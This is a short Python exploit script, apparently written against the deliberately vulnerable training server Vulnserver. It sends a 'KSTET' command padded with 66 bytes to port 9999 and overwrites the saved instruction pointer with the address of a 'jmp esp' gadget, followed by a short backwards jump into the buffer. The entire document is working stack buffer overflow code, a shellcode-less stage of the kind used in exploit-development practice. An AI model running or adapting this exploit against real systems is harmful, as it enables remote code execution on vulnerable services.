import socket, sys
from struct import pack

ip = sys.argv[1]
port = 9999

prefix = b'KSTET '
buffer = b'A' * 66
eip = pack('<L', 0x625012f0) # addr of ff e4 opcode
jc = b'\xE9\xB5\xFF\xFF\xFF' # jmp 0xffffffba (jump back 70 bytes)

payload = prefix + buffer + eip + jc

try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(5)
        s.connect((ip, port))
        print('[*] Sending payload')
        s.send(payload)
        s.recv(1024)
except Exception as e:
    print(e)
    sys.exit(0)

